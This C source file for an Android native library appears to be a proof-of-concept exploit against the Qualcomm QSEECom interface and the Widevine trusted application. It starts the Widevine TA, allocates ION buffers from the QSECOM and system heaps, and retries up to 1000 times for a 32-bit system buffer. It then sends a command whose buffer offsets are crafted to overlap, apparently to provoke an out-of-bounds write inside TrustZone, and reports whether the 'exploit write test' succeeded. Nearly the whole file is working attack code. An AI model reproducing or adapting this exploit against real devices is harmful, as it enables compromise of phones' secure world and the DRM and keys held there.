#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <dlfcn.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <inttypes.h>

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static JavaVM* g_vm = NULL;

struct QSEECom_handle;
struct QSEECom_ion_fd_data {
    int32_t fd;
    uint32_t cmd_buf_offset;
};
struct QSEECom_ion_fd_info {
    struct QSEECom_ion_fd_data data[4];
};

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_MAP _IOWR(ION_IOC_MAGIC, 7, struct ion_fd_data)

#define ION_HEAP_SYSTEM 25
#define ION_HEAP_QSECOM 27
#define ION_HEAP(heap_id) (1 << (heap_id))

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    unsigned int handle;
};
struct ion_fd_data {
    unsigned int handle;
    int fd;
};
struct ion_handle_data {
    unsigned int handle;
};

typedef struct {
    int dev_fd;
    unsigned int handle;
    int fd;
    void *map;
    size_t size;
} ion_data_t;

#define WIDEVINE_CMD_IN_OFFSET 0x20
#define WIDEVINE_CMD_OUT_OFFSET 0x30
#define EXPLOIT_BUFFER_SIZE 0x1000
#define SYSTEM_ION_SIZE 0x2000
#define MAX_32BIT_ION_ATTEMPTS 1000
#define ATTEMPTS_PRINT_PROGRESS 100

typedef int (*QSEECom_start_app_t)(struct QSEECom_handle **clnt_handle, const char *path,
                                   const char *fname, uint32_t sb_size);
typedef int (*QSEECom_shutdown_app_t)(struct QSEECom_handle **handle);
typedef int (*QSEECom_send_cmd_t)(struct QSEECom_handle *handle, void *send_buf,
                                  uint32_t sbuf_len, void *rcv_buf, uint32_t rbuf_len);
typedef int (*QSEECom_send_modified_cmd_t)(struct QSEECom_handle *handle, void *send_buf,
                                           uint32_t sbuf_len, void *resp_buf,
                                           uint32_t rbuf_len,
                                           struct QSEECom_ion_fd_info *ifd_data);

static QSEECom_start_app_t QSEECom_start_app = NULL;
static QSEECom_shutdown_app_t QSEECom_shutdown_app = NULL;
static QSEECom_send_cmd_t QSEECom_send_cmd = NULL;
static QSEECom_send_modified_cmd_t QSEECom_send_modified_cmd = NULL;

static struct QSEECom_handle *g_widevine_handle = NULL;
static ion_data_t g_ion_qsecom = {0};
static ion_data_t g_ion_system = {0};
static struct QSEECom_ion_fd_info g_exploit_fd_info = {0};
static struct QSEECom_ion_fd_info g_regular_fd_info = {0};

static int ion_memalloc(size_t size, int heap_id, ion_data_t *ion_data) {
    struct ion_allocation_data alloc_data = {
        .align = 0x1000,
        .len = size,
        .heap_id_mask = ION_HEAP(heap_id),
        .flags = 0,
        .handle = 0
    };
    struct ion_fd_data fd_data = {0};

    ion_data->dev_fd = -1;
    ion_data->handle = 0;
    ion_data->fd = -1;
    ion_data->map = MAP_FAILED;
    ion_data->size = size;

    ion_data->dev_fd = open("/dev/ion", O_RDONLY);
    if (-1 == ion_data->dev_fd) {
        LOGE("Failed to open /dev/ion");
        return 0;
    }

    if (0 != ioctl(ion_data->dev_fd, ION_IOC_ALLOC, &alloc_data)) {
        LOGE("ION_IOC_ALLOC failed");
        goto err;
    }
    ion_data->handle = alloc_data.handle;

    fd_data.handle = alloc_data.handle;
    if (0 != ioctl(ion_data->dev_fd, ION_IOC_MAP, &fd_data)) {
        LOGE("ION_IOC_MAP failed");
        goto err;
    }
    ion_data->fd = fd_data.fd;

    ion_data->map = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED,
                         ion_data->fd, 0);
    if (MAP_FAILED == ion_data->map) {
        LOGE("mmap failed");
        goto err;
    }

    return 1;

err:
    if (MAP_FAILED != ion_data->map) munmap(ion_data->map, ion_data->size);
    if (-1 != ion_data->fd) close(ion_data->fd);
    if (0 != ion_data->handle) {
        struct ion_handle_data hd = { .handle = ion_data->handle };
        ioctl(ion_data->dev_fd, ION_IOC_FREE, &hd);
    }
    if (-1 != ion_data->dev_fd) close(ion_data->dev_fd);
    memset(ion_data, 0, sizeof(ion_data_t));
    return 0;
}

static void ion_memfree(ion_data_t *ion_data) {
    if (MAP_FAILED != ion_data->map) {
        munmap(ion_data->map, ion_data->size);
        ion_data->map = MAP_FAILED;
    }
    if (-1 != ion_data->fd) {
        close(ion_data->fd);
        ion_data->fd = -1;
    }
    if (0 != ion_data->handle) {
        struct ion_handle_data hd = { .handle = ion_data->handle };
        ioctl(ion_data->dev_fd, ION_IOC_FREE, &hd);
        ion_data->handle = 0;
    }
    if (-1 != ion_data->dev_fd) {
        close(ion_data->dev_fd);
        ion_data->dev_fd = -1;
    }
}

static int get_32bit_system_ion(void) {
    int result = 0;
    ion_data_t ion_datas[MAX_32BIT_ION_ATTEMPTS] = {{0}};
    size_t i = 0;

    for (; i < MAX_32BIT_ION_ATTEMPTS; i++) {
        ion_data_t *cur_data = ion_datas + i;
        if (0 == ion_memalloc(SYSTEM_ION_SIZE, ION_HEAP_SYSTEM, cur_data)) {
            LOGE("Failed to allocate system ION at attempt #%zu", i);
            goto cleanup;
        }

        uint8_t cmd[0x200] = {0};
        uint8_t resp[0x8] = {0};
        struct QSEECom_ion_fd_info fd_info = {0};
        fd_info.data[0].fd = cur_data->fd;
        int ret = QSEECom_send_modified_cmd(g_widevine_handle, cmd, sizeof(cmd), resp,
                                            sizeof(resp), &fd_info);
        if (0 == ret) {
            break;
        }
        if (0 == (i + 1) % ATTEMPTS_PRINT_PROGRESS) {
            LOGD("Attempt %zu/%zu to get 32-bit system ION", i+1, MAX_32BIT_ION_ATTEMPTS);
        }
    }

    if (MAX_32BIT_ION_ATTEMPTS == i) {
        LOGE("Failed to get 32-bit system ION after %d attempts", MAX_32BIT_ION_ATTEMPTS);
        goto cleanup;
    }

    g_ion_system = ion_datas[i];
    result = 1;

cleanup:
    for (size_t j = 0; j <= i; j++) {
        if (1 != result || j != i) {
            ion_memfree(ion_datas + j);
        }
    }
    return result;
}

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    g_vm = vm;
    LOGD("JNI_OnLoad");
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved) {
    LOGD("JNI_OnUnload");
}

JNIEXPORT jobjectArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeListDir(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;

    DIR* dir = opendir(cpath);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (dir == NULL) {
        LOGE("opendir(%s) failed: %s", cpath, strerror(errno));
        return NULL;
    }

    int count = 0;
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] != '.') count++;
    }
    rewinddir(dir);

    jclass stringClass = (*env)->FindClass(env, "java/lang/String");
    if (stringClass == NULL) {
        closedir(dir);
        return NULL;
    }
    jobjectArray result = (*env)->NewObjectArray(env, count, stringClass, NULL);
    if (result == NULL) {
        closedir(dir);
        return NULL;
    }

    int idx = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        jstring name = (*env)->NewStringUTF(env, entry->d_name);
        if (name != NULL) {
            (*env)->SetObjectArrayElement(env, result, idx++, name);
            (*env)->DeleteLocalRef(env, name);
        }
    }
    closedir(dir);
    return result;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeReadFile(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;
    int fd = open(cpath, O_RDONLY);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (fd < 0) {
        LOGE("open(%s) failed: %s", cpath, strerror(errno));
        return NULL;
    }
    char buf[8192];
    ssize_t len = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (len <= 0) return NULL;
    buf[len] = '\0';
    jstring result = (*env)->NewStringUTF(env, buf);
    return result;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeTestQSEECom(JNIEnv* env, jclass clazz) {
    char result_buf[1024] = {0};
    int success = 0;

    if (access("/dev/ion", F_OK) != 0) {
        snprintf(result_buf, sizeof(result_buf), "FAIL: /dev/ion not found");
        return (*env)->NewStringUTF(env, result_buf);
    }
    if (access("/dev/qseecom", F_OK) != 0) {
        snprintf(result_buf, sizeof(result_buf), "FAIL: /dev/qseecom not found");
        return (*env)->NewStringUTF(env, result_buf);
    }

    void *qsee_handle = dlopen("libQSEEComAPI.so", RTLD_NOW);
    if (!qsee_handle) {
        qsee_handle = dlopen("/system/lib64/libQSEEComAPI.so", RTLD_NOW);
    }
    if (!qsee_handle) {
        snprintf(result_buf, sizeof(result_buf), "FAIL: Cannot load libQSEEComAPI.so");
        return (*env)->NewStringUTF(env, result_buf);
    }

    QSEECom_start_app = (QSEECom_start_app_t)dlsym(qsee_handle, "QSEECom_start_app");
    QSEECom_shutdown_app = (QSEECom_shutdown_app_t)dlsym(qsee_handle, "QSEECom_shutdown_app");
    QSEECom_send_cmd = (QSEECom_send_cmd_t)dlsym(qsee_handle, "QSEECom_send_cmd");
    QSEECom_send_modified_cmd = (QSEECom_send_modified_cmd_t)dlsym(qsee_handle, "QSEECom_send_modified_cmd");

    if (!QSEECom_start_app || !QSEECom_shutdown_app || !QSEECom_send_cmd || !QSEECom_send_modified_cmd) {
        snprintf(result_buf, sizeof(result_buf), "FAIL: Missing QSEECom symbols");
        dlclose(qsee_handle);
        return (*env)->NewStringUTF(env, result_buf);
    }

    const char *ta_path = "/vendor/firmware/widevine.mdt";
    if (access(ta_path, F_OK) != 0) {
        ta_path = "/firmware/image/widevine.mdt";
    }
    int ret = QSEECom_start_app(&g_widevine_handle, NULL, ta_path, 0x4000);
    if (ret != 0) {
        snprintf(result_buf, sizeof(result_buf), "FAIL: QSEECom_start_app returned %d", ret);
        dlclose(qsee_handle);
        return (*env)->NewStringUTF(env, result_buf);
    }
    snprintf(result_buf, sizeof(result_buf), "INFO: Widevine TA started, handle=%p", g_widevine_handle);

    if (0 == ion_memalloc(EXPLOIT_BUFFER_SIZE, ION_HEAP_QSECOM, &g_ion_qsecom)) {
        strncat(result_buf, " | FAIL: qsecom ION alloc failed", sizeof(result_buf)-strlen(result_buf)-1);
        QSEECom_shutdown_app(&g_widevine_handle);
        dlclose(qsee_handle);
        return (*env)->NewStringUTF(env, result_buf);
    }
    strncat(result_buf, " | qsecom ION OK", sizeof(result_buf)-strlen(result_buf)-1);

    if (0 == get_32bit_system_ion()) {
        strncat(result_buf, " | FAIL: system ION 32-bit alloc failed", sizeof(result_buf)-strlen(result_buf)-1);
        ion_memfree(&g_ion_qsecom);
        QSEECom_shutdown_app(&g_widevine_handle);
        dlclose(qsee_handle);
        return (*env)->NewStringUTF(env, result_buf);
    }
    strncat(result_buf, " | system ION 32-bit OK", sizeof(result_buf)-strlen(result_buf)-1);

    g_regular_fd_info.data[0].fd = g_ion_qsecom.fd;
    g_regular_fd_info.data[0].cmd_buf_offset = WIDEVINE_CMD_IN_OFFSET;
    g_regular_fd_info.data[1].fd = g_ion_qsecom.fd;
    g_regular_fd_info.data[1].cmd_buf_offset = WIDEVINE_CMD_OUT_OFFSET;

    g_exploit_fd_info.data[0].fd = g_ion_system.fd;
    g_exploit_fd_info.data[0].cmd_buf_offset = 0x100;
    g_exploit_fd_info.data[1].fd = g_ion_qsecom.fd;
    g_exploit_fd_info.data[1].cmd_buf_offset = 0x100 + 8;
    g_exploit_fd_info.data[2].fd = g_ion_qsecom.fd;
    g_exploit_fd_info.data[2].cmd_buf_offset = 0x100 - 4;
    g_exploit_fd_info.data[3].fd = g_ion_qsecom.fd;

    uint8_t test_data[8] = {0xde, 0xad, 0xbe, 0xef, 0x12, 0x34, 0x56, 0x78};
    memcpy(g_ion_qsecom.map, test_data, sizeof(test_data));

    if (0 != QSEECom_send_modified_cmd(g_widevine_handle, g_ion_qsecom.map, 0x100,
                                      NULL, 0, &g_regular_fd_info)) {
        strncat(result_buf, " | FAIL: encrypt test", sizeof(result_buf)-strlen(result_buf)-1);
        goto cleanup;
    }

    g_exploit_fd_info.data[3].cmd_buf_offset = WIDEVINE_CMD_IN_OFFSET;
    uint8_t cmd_buf[0x200] = {0};
    ret = QSEECom_send_modified_cmd(g_widevine_handle, cmd_buf, sizeof(cmd_buf),
                                   NULL, 0, &g_exploit_fd_info);
    if (ret == 0) {
        strncat(result_buf, " | EXPLOIT WRITE TEST SUCCESS (dummy)", sizeof(result_buf)-strlen(result_buf)-1);
        success = 1;
    } else {
        strncat(result_buf, " | EXPLOIT WRITE TEST FAILED", sizeof(result_buf)-strlen(result_buf)-1);
    }

cleanup:
    ion_memfree(&g_ion_system);
    ion_memfree(&g_ion_qsecom);
    if (g_widevine_handle) {
        QSEECom_shutdown_app(&g_widevine_handle);
    }
    if (qsee_handle) {
        dlclose(qsee_handle);
    }

    return (*env)->NewStringUTF(env, result_buf);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeTestFd(JNIEnv* env, jclass clazz, jint fd) {
    char buf[256] = {0};
    int flags = fcntl(fd, F_GETFL);
    if (flags < 0) {
        snprintf(buf, sizeof(buf), "fcntl failed: %s", strerror(errno));
        return (*env)->NewStringUTF(env, buf);
    }
    int type = flags & O_ACCMODE;
    const char* type_str;
    switch(type) {
        case O_RDONLY: type_str = "RDONLY"; break;
        case O_WRONLY: type_str = "WRONLY"; break;
        case O_RDWR: type_str = "RDWR"; break;
        default: type_str = "UNKNOWN";
    }
    snprintf(buf, sizeof(buf), "flags=0x%x (%s), nonblock=%d", flags, type_str, (flags & O_NONBLOCK)?1:0);
    return (*env)->NewStringUTF(env, buf);
}
